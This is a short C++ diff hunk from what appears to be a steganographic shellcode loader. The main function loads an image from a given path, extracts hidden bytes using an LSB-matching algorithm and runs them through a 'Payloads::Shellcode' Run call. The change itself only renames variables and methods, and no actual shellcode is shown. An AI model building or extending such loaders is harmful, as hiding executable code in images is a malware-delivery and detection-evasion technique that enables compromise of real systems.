@@ -8,20 +8,20 @@ int _tmain(int argc, TCHAR** argv) {
         GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
         // Do the job
-        int payload_bits = _ttoi(argv[1]);
+        int payload_size = _ttoi(argv[1]);
         LPCTSTR location = argv[2];
 
         // TEMPLATES GO HERE
         auto img = ImageSources::FileSystem();
-        Bitmap* bmp = img.loadImage(location);
+        Bitmap* bmp = img.Load(location);
 
 
         auto alg = Algorithms::LSBM();
-        uint8_t* payload_data = alg.readImage(bmp, payload_bits);
+        uint8_t* payload_data = alg.Read(bmp, payload_size);
 
 
         auto pld = Payloads::Shellcode();
-        pld.Run(payload_data, payload_bits);
+        pld.Run(payload_data, payload_size);
 
         // Shutdown Gdiplus
         GdiplusShutdown(gdiplusToken);
